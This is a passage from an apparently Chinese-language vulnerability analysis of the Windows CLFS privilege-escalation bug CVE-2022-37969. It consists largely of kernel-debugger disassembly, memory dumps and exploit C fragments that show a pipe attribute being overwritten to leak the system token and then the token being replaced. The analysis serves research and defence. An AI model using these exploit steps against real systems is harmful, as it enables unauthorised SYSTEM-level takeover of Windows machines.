style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], rcx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cd5<span style="color:#ae81ff">03</span>ca add ecx, edx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cd7<span style="color:#ae81ff">894</span>c2408 mov dword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], ecx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cdb<span style="color:#ae81ff">3</span>bca cmp ecx, edx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cdd<span style="color:#ae81ff">750</span>e jne CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3d</span> (fffff800112f1ced)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cdf<span style="color:#ae81ff">8</span>b4c240c mov ecx, dword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce3<span style="color:#ae81ff">85</span>c9 test ecx, ecx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce5<span style="color:#ae81ff">740</span>b je CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span> (fffff800112f1cf2)</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce7<span style="color:#ae81ff">03</span>ca add ecx, edx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ce9<span style="color:#ae81ff">894</span>c240c mov dword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>Ch], ecx</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>ced<span style="color:#ae81ff">488</span>b442408 mov rax, qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2 c3 ret</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> redx</span></span><span style="display:flex;"><span>edx<span style="color:#f92672">=</span>ffffffff</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>ClfsEarlierLsn<span style="color:#f92672">+</span><span style="color:#ae81ff">0x42</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf2 c3 ret</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf3 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf4 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf5 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf6 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf7 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf8 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">112f</span><span style="color:#ae81ff">1</span>cf9 cc<span style="color:#66d9ef">int</span><span style="color:#ae81ff">3</span></span></span></code></pre></div><p>在<code>SeSetAccessStateGenericMapping</code>函数中，将rdx存储的指针复制到rcx+48存储的指针指向的内存中，前面调用<code>ClfsEarlierLsn</code>之后，rdx指向<code>0xFFFFFFFF</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping:</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da0<span style="color:#ae81ff">488</span>b4148 mov rax, qword ptr [rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da4<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">1002</span> movups xmm0, xmmword ptr [rdx]</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>da7 f30f7f4008 movdqu xmmword ptr [rax<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], xmm0</span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span></code></pre></div><p>在内存<code>0xFFFFFFFF</code>已经存储了一个指针，该指针指向了system token</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rdx</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span>ffffffff ffffa48f<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4149e000</span><span style="color:#ae81ff">41414141</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">4141005</span>a</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000000f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000001f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000002f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000003f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000004f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000005f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000006f</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>v14<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xfff</span>;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> system_EPROCESS<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xfffffffffffff000</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> dest2<span style="color:#f92672">=</span><span style="color:#ae81ff">0xffffffff</span>;</span></span><span style="display:flex;"><span> dest3<span style="color:#f92672">=</span><span style="color:#ae81ff">0x100000007</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> value2<span style="color:#f92672">=</span><span style="color:#ae81ff">0x414141414141005A</span>;</span></span><span style="display:flex;"><span> value3<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> value3<span style="color:#f92672">=</span><span style="color:#f92672">&amp;</span>value2;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 在0xffffffff地址分配0x100000大小的内存</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">VirtualAlloc</span>((LPVOID)dest2,<span style="color:#ae81ff">0x100000</span>,<span style="color:#ae81ff">0x3000</span>,<span style="color:#ae81ff">4</span>))</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>((LPVOID)dest3,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xff8</span>);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 写入system_EPROCESS &amp; 0xfffffffffffff000;</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#f92672">*</span>(UINT64<span style="color:#f92672">*</span>)dest2<span style="color:#f92672">=</span> v15;</span></span></code></pre></div><p>而rcx+48存储了pipe的<code>AttributeValueSize</code>的地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rcx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093e8</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">005093f</span><span style="color:#ae81ff">8</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9408</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9418</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9428</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9438</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9448</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0050</span><span style="color:#ae81ff">9458</span><span style="color:#ae81ff">18</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ...<span style="color:#960050;background-color:#1e0010">$</span>............</span></span></code></pre></div><p>继续执行，将会把0xFFFFFFFF存储的指针写入到rax+8的地址上，内核中pipe对象的<code>AttributeValue</code> 值已经被覆盖为system token地址</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span></span></span><span style="display:flex;"><span>nt<span style="color:#f92672">!</span>SeSetAccessStateGenericMapping<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff800<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">151f</span><span style="color:#ae81ff">2</span>dac c3 ret</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax<span style="color:#f92672">-</span><span style="color:#ae81ff">0x18</span></span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c000 b0<span style="color:#ae81ff">32</span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">27</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span>b0<span style="color:#ae81ff">32</span><span style="color:#ae81ff">0</span>e<span style="color:#ae81ff">27</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#ae81ff">.2</span>.<span style="color:#960050;background-color:#1e0010">'</span>....<span style="color:#ae81ff">.2</span>.<span style="color:#960050;background-color:#1e0010">'</span>....</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c010<span style="color:#ae81ff">28</span> c0 f9<span style="color:#ae81ff">24</span><span style="color:#ae81ff">0</span>b bc ff ff<span style="color:#f92672">-</span>d6<span style="color:#ae81ff">0f</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> (..<span style="color:#960050;background-color:#1e0010">$</span>............</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c020<span style="color:#f92672">**</span><span style="color:#ae81ff">00</span> e0<span style="color:#ae81ff">49</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">8f</span> a4 ff<span style="color:#f92672">**</span> ff<span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>a<span style="color:#ae81ff">00</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> ..IA....Z.AAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c030<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c040<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c050<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c060<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span><span style="display:flex;"><span>ffffbc0b<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">24f</span><span style="color:#ae81ff">9</span>c070<span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#f92672">-</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span><span style="color:#ae81ff">41</span> AAAAAAAAAAAAAAAA</span></span></code></pre></div><p>之后通过_NtFsControlFile并设ControlCode为0x110038，则会读取pipe对象的AttributeValue并写入到用户提供的缓冲区中，读取到这里已经读取到了system token的地址。</p><p>为了完成token替换，exp第二次触发漏洞，在触发之前堆内存进行布局。把system token地址布局到0xFFFFFFFF，从0x10008开始每隔0x10把自身token地址写入到该地址中</p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/17.png"/></p><p><img alt="" src="/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/18.png"/></p><p>触发漏洞（这里重新调试了，所以地址不一样），在CLFS!CClfsBaseFilePersisted::RemoveContainer中断下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> g</span></span><span style="display:flex;"><span>Breakpoint<span style="color:#ae81ff">1</span> hit</span></span><span style="display:flex;"><span>CLFS<span style="color:#f92672">!</span>CClfsBaseFilePersisted<span style="color:#f92672">::</span>RemoveContainer<span style="color:#f92672">+</span><span style="color:#ae81ff">0x48</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span>fffff807<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">13</span>a66df8<span style="color:#ae81ff">488</span>bf8 mov rdi,rax</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db rax</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd070<span style="color:#ae81ff">06</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>c6<span style="color:#ae81ff">6</span>c<span style="color:#ae81ff">11</span><span style="color:#ae81ff">93</span><span style="color:#ae81ff">9</span>c<span style="color:#ae81ff">15</span> ee<span style="color:#ae81ff">11</span> .........l......</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd080 bc<span style="color:#ae81ff">82</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">0</span>c<span style="color:#ae81ff">29</span><span style="color:#ae81ff">07</span> fc<span style="color:#ae81ff">32</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ....).<span style="color:#ae81ff">.2</span>........</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd090<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0a0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0b0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span><span style="display:flex;"><span>ffff8e86<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0</span>c0dd0c0<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span 